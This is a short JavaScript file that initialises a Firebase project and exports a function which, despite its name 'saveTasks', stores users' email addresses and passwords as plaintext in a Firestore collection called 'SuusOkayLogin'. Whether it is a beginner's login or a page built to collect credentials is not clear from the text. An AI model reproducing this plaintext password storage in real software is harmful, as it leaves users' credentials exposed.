// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.13.0/firebase-app.js";
import { collection, getFirestore, addDoc} from "https://www.gstatic.com/firebasejs/9.13.0/firebase-firestore.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyAgTUo5m_WlXLtshpfDo9s4LOT8Giyl29s",
  authDomain: "suusokay-98105.firebaseapp.com",
  projectId: "suusokay-98105",
  storageBucket: "suusokay-98105.appspot.com",
  messagingSenderId: "319313796335",
  appId: "1:319313796335:web:f09117e15dc358d0f58f1a"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore();

//exporta los datos de correo y contraseña

export const saveTasks = (correo, contraseña) => {
    //console.log(correo, contraseña)
    addDoc(collection(db, 'SuusOkayLogin'), {correo, contraseña})
} 